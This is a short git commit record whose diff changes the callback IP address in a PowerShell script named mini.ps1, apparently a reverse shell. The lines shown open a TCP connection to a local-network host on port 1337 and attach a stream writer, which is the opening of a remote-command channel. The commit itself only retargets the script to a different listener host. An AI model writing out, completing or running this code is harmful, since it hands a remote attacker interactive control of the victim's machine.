28adb0cb40bd86011ff104def54bc37e5883c497
oleglerner <lerneroleg@gmail.com>
2019-10-11 23:16:59 +0300

    Update mini.ps1

--- mini.ps1
+++ mini.ps1
@@ -1,4 +1,4 @@
-$socket = new-object System.Net.Sockets.TcpClient('192.168.1.21', 1337);
+$socket = new-object System.Net.Sockets.TcpClient('192.168.1.17', 1337);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
